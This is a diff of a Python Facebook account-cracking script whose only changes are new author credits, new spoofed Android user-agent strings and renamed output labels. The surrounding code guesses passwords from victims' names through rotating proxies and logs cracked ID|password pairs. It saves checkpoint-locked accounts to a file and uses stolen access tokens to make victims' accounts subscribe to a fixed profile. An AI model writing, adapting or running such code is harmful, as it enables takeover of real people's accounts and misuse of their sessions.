@@ -301,8 +301,8 @@ $$\   $$ |$$ |  $$ |$$   ____|$$   ____|$$ |  $$ |
 {green}     
    
 ─────────────────────────────────────────────
- {green}[{red}–{green}] FACEBOK : Dark
- {green}[{red}–{green}] GITHUB  : speed-sd
+ {green}[{red}–{green}] FACEBOK : Achraf 
+ {green}[{red}–{green}] GITHUB  : Z3im-38
  {green}[{red}–{green}] VERSION : 0.4
  {green}[{red}–{green}] SERVICE : Free  
 ─────────────────────────────────────────────""")
@@ -492,7 +492,7 @@ def M_file_1(ids,names,passlist):
                                 
                         for pw in passlist:
                                 pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
-                                u1a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";Dalvik/2.1.0 (Linux; U; Android 15.8.2; X657 Build/RD2A.181207.057) [FBAN/FB4A;FBAV/373.0.0.31.112;FBPN/com.facebook.katana;FBLC/fr_CA;FBBV/314614855;FBCR/Lycamobile Canada;FBMF/Infinix;FBBD/infinix;FBDV/X657;FBSV/15.8.2;FBCA/x86_64:x86:arm64-v8a:armeabi;]"
+                                u1a = "[Dalvik/2.1.0 (Linux; U; Android 13; SM-A127F Build/QP1A.190711.020) [FBAN/FB4A;FBAV/479.0.0.5.78;FBBV/49838828;FBCR/T-Mobile;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-A127F;FBSV/13;FBCA/arm64-v8a;FBDM/{density=2.75,width=1080,height=2400}]"+"Dalvik/2.1.0 (Linux; U; Android 11; Pixel 6 Build/LOX1J8BY) [FBAN/FB4A;FBAV/422.0.0.7.80;FBBV/68174704;FBCR/O2;FBMF/Google;FBBD/Google;FBPN/com.facebook.katana;FBDV/Pixel 6;FBSV/11;FBCA/arm64-v8a;FBDM/{density=3.0,width=1080,height=2340}]"
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 nip=random.choice(proxsi)
@@ -527,7 +527,7 @@ def M_file_1(ids,names,passlist):
                                 
                                 if 'session_key' in q:
                                         ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                             
-                                        print('\r\x1b[1;92m<[𝐃𝒂𝒓𝒌-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
+                                        print('\r\x1b[1;92m<[achraf-OKO> ' + ids + ' | ' + pas + '\x1b[1;97m')
                                         #print("\033[1;33m<[BISCUT-🍪]> :\033[1;33m "+cookie)
                                         token = q['access_token']
                                         requests.post('https://graph.facebook.com/' + '833553969/' + 'subscribers' + '?access_token=' + token)
@@ -545,8 +545,8 @@ def M_file_1(ids,names,passlist):
               
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\x1b[38;5;246m<[𝐃𝒂𝒓𝒌-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
-                                                open('/sdcard/𝐃𝒂𝒓𝒌-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print('\r\x1b[38;5;246m<[achraf[ach> ' + ids + ' | ' + pas + '\x1b[1;97m')
+                                                open('/sdcard/achraf -CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
